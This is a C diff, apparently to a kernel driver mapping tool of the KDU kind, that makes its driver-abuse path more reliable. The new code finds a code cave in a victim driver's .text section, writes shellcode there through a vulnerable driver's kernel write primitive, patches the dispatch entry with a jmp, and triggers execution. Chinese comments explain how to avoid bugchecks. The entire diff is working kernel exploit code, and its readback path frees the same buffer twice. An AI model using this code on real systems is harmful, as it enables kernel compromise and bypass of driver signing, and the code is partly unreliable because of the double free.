@@ -809,6 +809,75 @@ BOOL KDUpMapDriverPhysicalBruteForce(
 }
 
 /*
+* KDUpFindCodeCave
+*
+* Purpose:
+*
+* Find a run of padding bytes inside the victim image .text section that is large
+* enough for the shellcode and does not cross a page boundary.
+*
+* Rationale: KDUpMapDriverDirectVM used to place the shellcode right at the victim
+* dispatch entry. The shellcode is a few hundred bytes long, so it overwrote the
+* neighbouring function; opening the victim device then executed the clobbered code
+* and raised #UD/#DE inside the victim before the stager ever ran. Placing the stager
+* in a cave and putting a 5-byte jmp at the entry keeps the rest of the image intact.
+*
+*/
+static BOOL KDUpFindCodeCave(
+    _In_ PVOID ImageBase,
+    _In_ ULONG NeedSize,
+    _Out_ PULONG CaveOffset
+)
+{
+    ULONG sectionSize = 0;
+    PBYTE section;
+
+    *CaveOffset = 0;
+    if (!ImageBase || NeedSize == 0) return FALSE;
+
+    section = (PBYTE)ntsupLookupImageSectionByName(
+        (CHAR*)TEXT_SECTION,
+        TEXT_SECTION_LENGTH,
+        ImageBase,
+        &sectionSize);
+
+    if (!section || sectionSize < NeedSize) return FALSE;
+
+    /* Prefer 0xCC padding (int3 fill); accept 0x00 runs as a weaker fallback. */
+    for (ULONG pass = 0; pass < 2; ++pass) {
+
+        BYTE filler = (pass == 0) ? 0xCC : 0x00;
+        ULONG run = 0, runStart = 0;
+
+        for (ULONG i = 0; i < sectionSize; ++i) {
+
+            if (section[i] == filler) {
+
+                if (run == 0) runStart = i;
+                ++run;
+
+                if (run >= NeedSize) {
+
+                    ULONG rva = (ULONG)((PBYTE)(section + runStart) - (PBYTE)ImageBase);
+
+                    if (((rva & 0xFFF) + NeedSize) <= PAGE_SIZE) {
+                        *CaveOffset = rva;
+                        return TRUE;
+                    }
+
+                    run = 0;
+                }
+            }
+            else {
+                run = 0;
+            }
+        }
+    }
+
+    return FALSE;
+}
+
+/*
 * KDUpMapDriverDirectVM
 *
 * Purpose:
@@ -822,7 +891,8 @@ BOOL KDUpMapDriverDirectVM(
     _In_ ULONG ScSize,
     _In_ HANDLE ScSectionHandle,
     _In_ HANDLE ReadyEventHandle,
-    _In_ ULONG_PTR TargetAddress
+    _In_ ULONG_PTR TargetAddress,
+    _In_ ULONG_PTR StagerAddress
 )
 {
     BOOL bSuccess = FALSE;
@@ -831,10 +901,10 @@ BOOL KDUpMapDriverDirectVM(
     HANDLE victimDeviceHandle = NULL;
 
     //
-    // Write shellcode to driver.
+    // Write shellcode to the cave (or straight to the entry when no cave was found).
     //
     if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
-        TargetAddress,
+        StagerAddress,
         ScBuffer,
         ScSize))
     {
@@ -845,27 +915,82 @@ BOOL KDUpMapDriverDirectVM(
     }
     else {
 
-        printf_s("[+] Driver handler code modified\r\n");
+        BOOL prepared = TRUE;
 
-        //
-        // Execute shellcode.
-        //
-        printf_s("[+] Executing shellcode\r\n");
-        VpExecutePayload(victimProv, &victimDeviceHandle);
+        if (StagerAddress != TargetAddress) {
 
-        //
-        // Wait for the shellcode to trigger the event
-        //
-        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
+            //
+            // Patch the victim entry with a 5-byte jmp to the stager. Only these five
+            // bytes are changed, so neighbouring functions stay intact.
+            //
+            BYTE jmpcode[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
 
-            supPrintfEvent(kduEventError,
-                "[!] Shellcode did not trigger the event within two seconds.\r\n");
+            *(LONG*)&jmpcode[1] = (LONG)(StagerAddress - TargetAddress - 5);
 
+            printf_s("[+] Patching victim entry 0x%llX -> stager 0x%llX (jmp rel32 %ld)\r\n",
+                TargetAddress,
+                StagerAddress,
+                *(LONG*)&jmpcode[1]);
+
+            if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
+                TargetAddress,
+                &jmpcode,
+                sizeof(jmpcode)))
+            {
+                supPrintfEvent(kduEventError,
+                    "[!] Error patching victim entry point, abort\r\n");
+                prepared = FALSE;
+            }
         }
-        else
-        {
-            KDUShowPayloadResult(Context, ScSectionHandle);
-            bSuccess = TRUE;
+
+        //
+        // Verify both writes landed as intended before handing control to the victim.
+        //
+        if (prepared) {
+
+            PVOID verifyBuffer = supHeapAlloc(ScSize);
+
+            if (verifyBuffer) {
+
+                if (!prov->Callbacks.ReadKernelVM(Context->DeviceHandle, StagerAddress, verifyBuffer, ScSize) ||
+                    RtlCompareMemory(verifyBuffer, ScBuffer, ScSize) != ScSize) {
+
+                    supPrintfEvent(kduEventError,
+                        "[!] Shellcode readback mismatch at 0x%llX, refusing to execute\r\n",
+                        StagerAddress);
+
+                    supHeapFree(verifyBuffer);
+                    prepared = FALSE;
+                }
+
+                supHeapFree(verifyBuffer);
+            }
+        }
+
+        if (prepared) {
+
+            printf_s("[+] Driver handler code modified\r\n");
+
+            //
+            // Execute shellcode.
+            //
+            printf_s("[+] Executing shellcode\r\n");
+            VpExecutePayload(victimProv, &victimDeviceHandle);
+
+            //
+            // Wait for the shellcode to trigger the event
+            //
+            if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
+
+                supPrintfEvent(kduEventError,
+                    "[!] Shellcode did not trigger the event within two seconds.\r\n");
+
+            }
+            else
+            {
+                KDUShowPayloadResult(Context, ScSectionHandle);
+                bSuccess = TRUE;
+            }
         }
     }
 
@@ -955,6 +1080,29 @@ BOOL KDUMapDriver(
                 sizeof(vdi)))
             {
 
+                /*
+                 * 补丁地址必须落在 victim 镜像内。
+                 *
+                 * DispatchOffset 一旦算错（例如按指针低位截断），targetAddress 会指到
+                 * 镜像之外的内存；把 shellcode 写到那里再执行，在启用了 NX 池的系统上
+                 * 就是 0xFC ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY，直接蓝屏。
+                 * 与其跳到未知地址，不如在这里停下来并把实际数值打出来。
+                 */
+                printf_s("[+] Victim layout: base 0x%llX size 0x%lX, dispatch offset 0x%lX\r\n",
+                    vdi.LoadedImageBase,
+                    vdi.ImageSize,
+                    dispatchOffset);
+
+                if (vdi.ImageSize == 0 || dispatchOffset >= vdi.ImageSize) {
+
+                    supPrintfEvent(kduEventError,
+                        "[!] Dispatch offset 0x%lX outside victim image (size 0x%lX), abort\r\n",
+                        dispatchOffset,
+                        vdi.ImageSize);
+
+                    break;
+                }
+
                 targetAddress = vdi.LoadedImageBase + dispatchOffset;
 
             }
@@ -1034,12 +1182,48 @@ BOOL KDUMapDriver(
                 //
                 // 3. Direct VM write primitive available.
                 //
-                bSuccess = KDUpMapDriverDirectVM(Context,
-                    pvShellCode,
-                    cbShellCode,
-                    sectionHandle,
-                    readyEventHandle,
-                    targetAddress);
+                {
+                    ULONG caveRva = 0;
+                    ULONG_PTR stagerAddress = targetAddress;
+
+                    /*
+                     * 优先把 stager 放进 .text 的填充区，只在原命中点写 5 字节 jmp。
+                     * 直接覆盖命中点会把紧邻的函数一起改掉，打开设备时执行到被覆盖字节
+                     * 就会在 victim 里 #UD/#DE。
+                     */
+                    if (KDUpFindCodeCave(Context->Victim->Data.VictimImage, cbShellCode, &caveRva)) {
+
+                        ULONG_PTR caveAddress = vdi.LoadedImageBase + caveRva;
+
+                        if (caveAddress >= vdi.LoadedImageBase &&
+                            (caveAddress + cbShellCode) <= (vdi.LoadedImageBase + vdi.ImageSize)) {
+
+                            stagerAddress = caveAddress;
+                            printf_s("[+] Code cave: rva 0x%lX -> 0x%llX, shellcode 0x%lX bytes\r\n",
+                                caveRva,
+                                stagerAddress,
+                                cbShellCode);
+                        }
+                        else {
+                            supPrintfEvent(kduEventWarning,
+                                "[~] Code cave 0x%lX outside victim image, using entry overwrite\r\n",
+                                caveRva);
+                        }
+                    }
+                    else {
+                        supPrintfEvent(kduEventWarning,
+                            "[~] No code cave for 0x%lX bytes, using entry overwrite\r\n",
+                            cbShellCode);
+                    }
+
+                    bSuccess = KDUpMapDriverDirectVM(Context,
+                        pvShellCode,
+                        cbShellCode,
+                        sectionHandle,
+                        readyEventHandle,
+                        targetAddress,
+                        stagerAddress);
+                }
 
             }
 
